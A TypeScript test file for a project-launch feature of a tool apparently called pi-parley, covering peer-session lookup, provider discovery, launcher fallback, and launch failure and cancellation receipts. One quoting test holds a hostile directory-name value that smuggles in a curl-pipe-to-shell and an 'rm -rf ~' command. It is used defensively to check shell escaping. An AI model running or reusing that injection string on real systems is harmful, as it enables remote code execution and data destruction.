import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync , realpathSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import type { ChildProcess } from "child_process";
import {
  PROJECT_LAUNCH_NAMESPACE,
  PROJECT_LAUNCH_REQUEST_TYPE,
  ProjectLaunchError,
  findProjectLaunchProvider,
  launchProjectCommand,
  openProjectPane,
  parseProjectLaunchRequest,
  projectLaunchRequestText,
  resolveProjectLauncherCommand,
  resolveTargetInCwd,
  waitForProjectSession,
  type LaunchCommandSpawn,
  type ProjectLaunchRequest,
  type ProjectPaneLaunch,
} from "./project-agent.ts";
import type { SessionInfo } from "./types.ts";

function session(
  id: string,
  name: string | undefined,
  cwd: string,
  extra: Partial<SessionInfo> = {},
): SessionInfo {
  return {
    id,
    ...(name ? { name } : {}),
    cwd,
    model: "test-model",
    pid: process.pid,
    startedAt: 1,
    lastActivity: 1,
    ...extra,
  };
}

test("resolveTargetInCwd selects the sole peer in the requested cwd", () => {
  const resolved = resolveTargetInCwd({
    sessions: [
      session("self", "self", "/repo-a"),
      session("worker-a", "worker", "/repo-b"),
      session("worker-other", "worker", "/repo-c"),
    ],
    currentSessionId: "self",
    targetCwd: "/repo-b",
  });

  assert.equal(resolved.kind, "found");
  assert.equal(resolved.session?.id, "worker-a");
});

test("resolveTargetInCwd fails when a cwd has multiple possible peers and no target", () => {
  assert.throws(
    () => resolveTargetInCwd({
      sessions: [
        session("self", "self", "/repo-a"),
        session("worker-a", "worker-a", "/repo-b"),
        session("worker-b", "worker-b", "/repo-b"),
      ],
      currentSessionId: "self",
      targetCwd: "/repo-b",
    }),
    /Multiple parley sessions are connected in \/repo-b/,
  );
});

test("resolveTargetInCwd scopes names to the requested cwd", () => {
  const resolved = resolveTargetInCwd({
    sessions: [
      session("self", "self", "/repo-a"),
      session("worker-a", "worker", "/repo-b"),
      session("worker-other", "worker", "/repo-c"),
    ],
    currentSessionId: "self",
    targetCwd: "/repo-b",
    to: "worker",
  });

  assert.equal(resolved.kind, "found");
  assert.equal(resolved.session?.id, "worker-a");
});

test("provider discovery prefers the longest-running advertised session and never picks self", () => {
  const advertised = (id: string, startedAt: number): SessionInfo => session(id, id, "/anywhere", {
    startedAt,
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
  });

  assert.equal(
    findProjectLaunchProvider([
      advertised("newer-provider", 300),
      advertised("older-provider", 100),
      session("plain-peer", "plain", "/anywhere"),
    ], "self")?.id,
    "older-provider",
    "the oldest running provider wins deterministically",
  );
  assert.equal(
    findProjectLaunchProvider([advertised("self-provider", 1)], "self-provider"),
    undefined,
    "the requesting session never provides its own launch",
  );
  assert.equal(
    findProjectLaunchProvider([session("plain", "plain", "/anywhere")], "self"),
    undefined,
    "sessions without the namespace are not providers",
  );
  const remoteProvider = session("remote-provider", "remote", "/anywhere", {
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
    federation: {
      originId: "host:penguin",
      remoteScopeAlias: "mistfall-remote",
      remoteStableSessionId: "remote-stable-id",
    },
  });
  assert.equal(
    findProjectLaunchProvider([remoteProvider], "self"),
    undefined,
    "federated rows are never picked as local project-launch providers",
  );
});

test("launch request text round-trips through the documented provider contract", () => {
  const request: ProjectLaunchRequest = {
    type: PROJECT_LAUNCH_REQUEST_TYPE,
    root: "/Users/me/projects/billing",
    command: "pi",
    focus: true,
  };
  const parsed = parseProjectLaunchRequest(projectLaunchRequestText(request));
  assert.deepEqual(parsed, request);
  assert.equal(parseProjectLaunchRequest("an ordinary human message"), undefined);
  assert.equal(parseProjectLaunchRequest(JSON.stringify({ type: "other-request" })), undefined);
  assert.equal(
    parseProjectLaunchRequest(JSON.stringify({ type: PROJECT_LAUNCH_REQUEST_TYPE, root: "", command: "pi", focus: true })),
    undefined,
  );
});

test("openProjectPane reports transport acceptance and the provider request handle, not session creation", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-parley-project-launch-"));
  const project = join(root, "project");
  mkdirSync(project);
  const provider = session("provider-1", "flightdeck", "/anywhere", {
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
  });
  const requests: Array<{ providerId: string; request: ProjectLaunchRequest }> = [];
  try {
    const launched = await openProjectPane({
      cwd: project,
      focus: false,
      sessions: [provider, session("self", "self", "/anywhere")],
      currentSessionId: "self",
      sendRequest: async (target, request) => {
        requests.push({ providerId: target.id, request });
        return { delivered: true, id: "launch-request-full-message-id" };
      },
    });

    assert.equal(launched.outcome, "request-accepted");
    assert.equal(launched.requestMessageId, "launch-request-full-message-id");
    assert.equal(launched.projectRoot.includes("project"), true);
    assert.deepEqual(launched.provider, { kind: "session", sessionId: "provider-1", name: "flightdeck" });
    assert.equal(requests.length, 1);
    assert.equal(requests[0]?.providerId, "provider-1");
    assert.equal(requests[0]?.request.type, PROJECT_LAUNCH_REQUEST_TYPE);
    assert.equal(requests[0]?.request.command, "pi");
    assert.equal(requests[0]?.request.focus, false);
    assert.equal(requests[0]?.request.root, launched.projectRoot);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("openProjectPane falls back to the configured launch command when no provider is registered", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-parley-command-launch-"));
  const project = join(root, "project");
  mkdirSync(project);
  const commandLines: string[] = [];
  const spawnImpl: LaunchCommandSpawn = (commandLine, options) => {
    commandLines.push(commandLine);
    assert.equal(options.cwd, options.env.PI_PARLEY_PROJECT_ROOT);
    return {
      on: (event: string, listener: (code: number) => void) => {
        if (event === "close") setTimeout(() => listener(0), 1);
        return null as never as ChildProcess;
      },
      kill: () => {},
    } as unknown as ChildProcess;
  };
  try {
    const launched = await openProjectPane({
      cwd: project,
      sessions: [session("self", "self", "/anywhere")],
      currentSessionId: "self",
      launcherCommand: "tmux new-window -c \"{root}\" pi",
      sendRequest: () => Promise.reject(new Error("no provider should be asked")),
      spawnImpl,
    });

    assert.equal(launched.outcome, "command-started");
    assert.equal(launched.provider.kind, "command");
    if (launched.provider.kind === "command") {
      assert.equal(launched.provider.command, "tmux new-window -c \"{root}\" pi");
    }
    assert.equal(commandLines[0]?.startsWith("tmux new-window -c "), true);
    assert.match(commandLines[0] ?? "", / pi$/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("openProjectPane fails standalone with both generic integration paths when nothing is available", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-parley-no-launcher-"));
  const project = join(root, "project");
  mkdirSync(project);
  try {
    await assert.rejects(
      openProjectPane({
        cwd: project,
        sessions: [session("self", "self", "/anywhere")],
        currentSessionId: "self",
        sendRequest: () => Promise.reject(new Error("no provider")),
      }),
      (error: unknown) => {
        assert.ok(error instanceof ProjectLaunchError);
        assert.equal(error.stage, "launch");
        assert.equal(error.launch, undefined);
        assert.match(error.message, /No project launcher is available[\s\S]*project-launch-v1[\s\S]*PI_PARLEY_PROJECT_LAUNCHER/);
        assert.match(error.message, /No launch was attempted/);
        assert.doesNotMatch(error.message, /tmux|new-window|for example|\{root\}/);
        return true;
      },
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("launch commands substitute {root} safely quoted and never carry injection metacharacters bare", async () => {
  const commandLines: string[] = [];
  const spawnImpl: LaunchCommandSpawn = (commandLine, _options) => {
    commandLines.push(commandLine);
    return {
      on: (event: string, listener: (code: number) => void) => {
        if (event === "close") setTimeout(() => listener(0), 1);
        return null as never as ChildProcess;
      },
      kill: () => {},
    } as unknown as ChildProcess;
  };

  await launchProjectCommand("open-terminal {root}", "/safe/project", { spawnImpl });
  assert.equal(commandLines[0], "open-terminal '/safe/project'");

  const hostile = "/tmp/x; curl ev'il|sh`$(rm -rf ~)";
  await launchProjectCommand("open-terminal {root}", hostile, { spawnImpl });
  assert.equal(
    commandLines[1],
    `open-terminal '${hostile.replaceAll("'", "'\\''")}'`,
    "a hostile directory name is fully contained inside shell quoting",
  );
});

test("launch commands substitute {root}, fail on early non-zero exit, and treat still-running commands as launched", async () => {
  const exitAfter = (delayMs: number, code: number | null): LaunchCommandSpawn => (_commandLine, _options) =>
    ({
      on: (event: string, listener: (exitCode: number | null) => void) => {
        if (event === "close") setTimeout(() => listener(code), delayMs);
        return null as never as ChildProcess;
      },
      kill: () => {},
    }) as unknown as ChildProcess;

  // A command that exits zero resolved the launch.
  await launchProjectCommand("open-terminal {root}", "/repo", { spawnImpl: exitAfter(5, 0) });
  // A command still running past the failure window launched fine; its later
  // exit (or lifetime) is not pi-parley's to manage.
  await launchProjectCommand("open-terminal {root}", "/repo", {
    spawnImpl: exitAfter(80, 1),
    failureWindowMs: 50,
  });
  // A command that exits non-zero inside the window failed to launch.
  await assert.rejects(
    launchProjectCommand("open-terminal {root}", "/repo", { spawnImpl: exitAfter(10, 127) }),
    /exited with code 127/,
  );
  await assert.rejects(
    launchProjectCommand("", "/repo", { spawnImpl: exitAfter(10, 0) }),
    /must not be empty/,
  );
});

test("launcher command resolution prefers the environment over config and has no built-in default", () => {
  assert.equal(resolveProjectLauncherCommand({ PI_PARLEY_PROJECT_LAUNCHER: "tmux new-window -c {root} pi" }), "tmux new-window -c {root} pi");
  assert.equal(resolveProjectLauncherCommand({}, "config-command"), "config-command");
  assert.equal(resolveProjectLauncherCommand({}, undefined), undefined);
  assert.equal(resolveProjectLauncherCommand({ PI_PARLEY_PROJECT_LAUNCHER: "   " }, "config-command"), "config-command");
});

test("waitForProjectSession returns the new project-pane session when no target is named", async () => {
  const before = [session("self", "self", "/repo-a")];
  const after = [...before, session("pane-peer", "session-pane", "/repo-b")];
  let calls = 0;
  const client = {
    async listSessions() {
      calls += 1;
      return calls === 1 ? before : after;
    },
  };

  const resolved = await waitForProjectSession(client, {
    projectRoot: "/repo-b",
    currentSessionId: "self",
    beforeSessionIds: new Set(before.map((item) => item.id)),
    pollMs: 1,
    timeoutMs: 100,
  });

  assert.equal(resolved.id, "pane-peer");
});

test("a missing named target can launch a generically named local session without adopting a remote same-path peer", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-parley-project-workflow-"));
  const provider = session("provider", "terminal-service", "/elsewhere", {
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
  });
  const remote = session("remote", "worker", root, {
    federation: { originId: "host:other", remoteScopeAlias: "remote", remoteStableSessionId: "worker" },
  });
  const before = [session("self", "self", root), provider, remote];
  const roster = [...before];
  let launches = 0;
  try {
    const missing = resolveTargetInCwd({ sessions: roster, currentSessionId: "self", targetCwd: root, to: "worker" });
    assert.equal(missing.kind, "missing", "a remote cwd is not the requested local project");
    assert.match(missing.reason!, /No local parley session[\s\S]*visible/);
    assert.doesNotMatch(missing.reason!, /launch|terminal|tmux/);
    assert.equal(resolveTargetInCwd({ sessions: [remote], currentSessionId: "self", targetCwd: root }).kind, "missing");

    const launch = await openProjectPane({
      cwd: root,
      sessions: before,
      currentSessionId: "self",
      sendRequest: async (_provider, request) => {
        launches += 1;
        const received = parseProjectLaunchRequest(projectLaunchRequestText(request))!;
        // A provider can honor the complete v1 request without knowing "worker".
        roster.push(session("generated-local-id", "session-automatic", received.root));
        return { delivered: true, id: "launch-request" };
      },
    });
    const registered = await waitForProjectSession({ listSessions: async () => roster }, {
      projectRoot: launch.projectRoot,
      launch,
      currentSessionId: "self",
      beforeSessionIds: new Set(before.map((item) => item.id)),
      timeoutMs: 100,
    });
    assert.equal(registered.id, "generated-local-id");
    assert.equal(registered.name, "session-automatic");
    assert.equal(launches, 1);

    // The caller can retain both completed observations if contacting it fails.
    const failure = new ProjectLaunchError("Message acceptance is unknown.", {
      stage: "delivery", launch, session: registered, cause: new Error("connection lost"),
    });
    assert.equal(failure.launch?.requestMessageId, "launch-request");
    assert.equal(failure.session?.id, "generated-local-id");
    assert.equal(failure.stage, "delivery");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("provider rejection and lost acknowledgement preserve whether a launch could already exist, without command fallback", async (t) => {
  const root = mkdtempSync(join(tmpdir(), "pi-parley-launch-receipts-"));
  const provider = session("provider", "terminal-service", "/elsewhere", {
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
  });
  try {
    for (const scenario of ["rejected", "uncertain-receipt", "lost-ack"] as const) {
      await t.test(scenario, async () => {
        let launchRequests = 0;
        let terminals = 0;
        await assert.rejects(openProjectPane({
          cwd: root,
          sessions: [provider],
          currentSessionId: "self",
          launcherCommand: "unused-fallback",
          spawnImpl: () => { throw new Error("provider failure must not launch a second terminal"); },
          sendRequest: async () => {
            launchRequests += 1;
            if (scenario === "rejected") return { delivered: false, outcomeKnown: true, id: "rejected-request", reason: "provider disconnected" };
            terminals += 1;
            if (scenario === "lost-ack") throw new Error("connection lost after provider acted");
            return { delivered: false, outcomeKnown: false, id: "uncertain-request", reason: "acknowledgement lost" };
          },
        }), (error: unknown) => {
          assert.ok(error instanceof ProjectLaunchError);
          assert.equal(error.stage, "launch");
          assert.equal(error.launch?.provider.kind, "session");
          assert.equal(error.launch?.outcome, scenario === "rejected" ? "not-started" : "unknown");
          assert.equal(error.launch?.requestMessageId, scenario === "lost-ack" ? undefined : `${scenario === "rejected" ? "rejected" : "uncertain"}-request`);
          assert.equal(error.session, undefined);
          if (scenario !== "rejected") assert.match(error.message, /may already have acted[\s\S]*duplicate/);
          return true;
        });
        assert.equal(launchRequests, 1);
        assert.equal(terminals, scenario === "rejected" ? 0 : 1);
      });
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("registration failures preserve the accepted launch, and a late session can be observed without relaunching", async (t) => {
  const root = mkdtempSync(join(tmpdir(), "pi-parley-registration-receipts-"));
  const provider = session("provider", "terminal-service", "/elsewhere", {
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
  });
  const before = [provider];
  let launchRequests = 0;
  // The application normally owns the event loop while an unref'ed roster poll waits.
  const keepAlive = setInterval(() => {}, 1_000);
  try {
    const launch = await openProjectPane({
      cwd: root,
      sessions: before,
      currentSessionId: "self",
      sendRequest: async () => {
        launchRequests += 1;
        return { delivered: true, id: "accepted-launch-request" };
      },
    });
    const waiting = {
      projectRoot: launch.projectRoot,
      launch,
      currentSessionId: "self",
      beforeSessionIds: new Set(before.map((item) => item.id)),
      timeoutMs: 20,
      pollMs: 1,
    };
    const remote = session("remote-peer", "remote", root, {
      federation: { originId: "host:other", remoteScopeAlias: "remote", remoteStableSessionId: "new-peer" },
    });
    const self = session("self", "self", root);
    for (const scenario of ["timeout", "cancelled", "roster-failure", "ambiguous"] as const) {
      await t.test(scenario, async () => {
        const controller = new AbortController();
        const client = {
          listSessions: async () => {
            if (scenario === "cancelled") controller.abort();
            if (scenario === "roster-failure") throw new Error("roster disconnected");
            if (scenario === "ambiguous") return [session("first", "first", root), session("second", "second", root)];
            // Neither a newly visible requester nor a remote same-path session
            // demonstrates that a new local project peer has registered.
            return [...before, remote, self];
          },
        };
        await assert.rejects(waitForProjectSession(client, { ...waiting, signal: controller.signal }), (error: unknown) => {
          assert.ok(error instanceof ProjectLaunchError);
          assert.equal(error.stage, "registration");
          assert.deepEqual(error.launch, launch);
          assert.equal(error.launch?.outcome, "request-accepted");
          assert.equal(error.session, undefined);
          assert.match(error.message, /not been undone[\s\S]*duplicate/);
          assert.match(error.message, scenario === "timeout" ? /Timed out/ : scenario === "cancelled" ? /Cancelled/ : scenario === "roster-failure" ? /roster disconnected/ : /Multiple new local/);
          return true;
        });
      });
    }
    const late = session("late-session", "automatically-named", root);
    assert.equal((await waitForProjectSession({ listSessions: async () => [...before, remote, late] }, {
      ...waiting, timeoutMs: 100,
    })).id, late.id);
    assert.equal(launchRequests, 1, "observing the late registration reuses the launch receipt without requesting more resources");
  } finally {
    clearInterval(keepAlive);
    rmSync(root, { recursive: true, force: true });
  }
});

test("a real launcher can create resources and still fail; cancellation before launch creates none", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-parley-command-side-effects-"));
  const launchScript = join(root, "launcher.cjs");
  writeFileSync(launchScript, "require('node:fs').writeFileSync('created-resource', 'exists'); process.exit(7);\n");
  const command = `"${process.execPath}" launcher.cjs`;
  try {
    await assert.rejects(openProjectPane({
      cwd: root,
      sessions: [],
      currentSessionId: "self",
      launcherCommand: command,
      sendRequest: async () => { throw new Error("no provider available"); },
    }), (error: unknown) => {
      assert.ok(error instanceof ProjectLaunchError);
      const receipt: ProjectPaneLaunch | undefined = error.launch;
      assert.equal(error.stage, "launch");
      assert.equal(receipt?.outcome, "unknown");
      assert.deepEqual(receipt?.provider, { kind: "command", command });
      assert.match(error.message, /exited with code 7[\s\S]*may already have created resources/);
      return true;
    });
    assert.equal(readFileSync(join(root, "created-resource"), "utf8"), "exists");
    rmSync(join(root, "created-resource"));

    const controller = new AbortController();
    controller.abort();
    await assert.rejects(openProjectPane({
      cwd: root,
      sessions: [],
      currentSessionId: "self",
      launcherCommand: command,
      signal: controller.signal,
      sendRequest: async () => { throw new Error("no provider available"); },
      spawnImpl: () => { throw new Error("cancelled launch must not spawn"); },
    }), (error: unknown) => {
      assert.ok(error instanceof ProjectLaunchError);
      assert.equal(error.launch, undefined);
      assert.match(error.message, /cancelled before/);
      return true;
    });
    assert.throws(() => readFileSync(join(root, "created-resource")), { code: "ENOENT" });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("openProjectPane gives configured launchers the canonical project root", async () => {
  const root = mkdtempSync(join(tmpdir(), "parley-launch-root-"));
  const project = join(root, "project");
  mkdirSync(project);
  const spawnImpl: LaunchCommandSpawn = (_commandLine, options) => {
    const resolvedProject = realpathSync(project);
    assert.equal(options.env.PI_PARLEY_PROJECT_ROOT, resolvedProject);
    return {
      on: (event: string, listener: (code: number) => void) => {
        if (event === "close") setTimeout(() => listener(0), 1);
        return null as never as ChildProcess;
      },
      kill: () => {},
    } as unknown as ChildProcess;
  };
  try {
    const launched = await openProjectPane({
      cwd: project,
      sessions: [session("self", "self", "/anywhere")],
      currentSessionId: "self",
      launcherCommand: "project-launcher \"$PI_PARLEY_PROJECT_ROOT\"",
      sendRequest: () => Promise.reject(new Error("no provider should be asked")),
      spawnImpl,
    });
    assert.equal(launched.outcome, "command-started");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("project launch requests use the configured Pi executable", async () => {
  const root = mkdtempSync(join(tmpdir(), "parley-pibin-"));
  const project = join(root, "project");
  mkdirSync(project);
  const previous = process.env.PI_PARLEY_PI_BIN;
  try {
    process.env.PI_PARLEY_PI_BIN = "/configured/bin/pi";
    let requestedCommand: string | undefined;
    await openProjectPane({
      cwd: project,
      sessions: [{ ...session("provider", "provider", project), extensions: [{ namespace: "pi-parley/project-launch-v1" }] }],
      currentSessionId: "self",
      sendRequest: async (_target, request) => {
        requestedCommand = request.command;
        return { delivered: true, id: "launch-request" };
      },
    });
    assert.equal(requestedCommand, "/configured/bin/pi");
  } finally {
    if (previous === undefined) delete process.env.PI_PARLEY_PI_BIN;
    else process.env.PI_PARLEY_PI_BIN = previous;
    rmSync(root, { recursive: true, force: true });
  }
});
